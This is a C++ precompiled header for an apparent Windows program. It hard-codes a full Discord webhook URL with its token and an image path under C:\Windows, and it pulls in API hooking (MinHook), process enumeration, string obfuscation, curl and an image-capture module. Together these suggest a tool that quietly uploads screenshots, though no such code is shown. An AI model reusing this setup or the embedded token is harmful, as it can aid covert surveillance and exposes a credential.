#pragma warning(disable : 4005)
#pragma warning(disable : 4244)
#pragma warning(disable : 6001)
#pragma warning(disable : 6031)
#pragma warning(disable : 6387)
#pragma warning(disable : 26495)
#pragma warning(disable : 26812)
#pragma warning(disable:4996)
#ifndef PCH_H
#define PCH_H
#define CURL_STATICLIB
#define WIN32_LEAN_AND_MEAN
#define WEBHOOK "https://discord.com/api/v10/webhooks/1011471393688404010/_hMKmgAbfRcLjH-h-L691PIC8_G_YohLY8mvK7EHnUWOo0ULmfPo6Me9xzmKGAkxT5VX"
#define IMG_DIR L"C:\\Windows\\Info.png"
#include <windows.h>
#include <string>
#include <thread>
#include <comdef.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <tchar.h>
#include <vector>
#include <iomanip>
#include <stdio.h>
#include <ntstatus.h>
#include <iostream>
#include <winnt.h>
#include <fstream>
#include <winternl.h>
#include <shlwapi.h>
#include <gdiplus.h>
#include "MinHook.h"

#pragma comment(lib,"shlwapi.lib")
#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "Normaliz.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment (lib,"gdiplus.lib")

#if defined(_WIN64)
#pragma comment(lib, "mh64.lib")
#pragma comment(lib, "libcurl.lib")
#elif defined(_WIN32)
#pragma comment(lib, "mh86.lib")
#endif

#include "skStr.h"
#include "curl/curl.h"
#include "Utils.h"
#include "ImgCap.h"
#endif
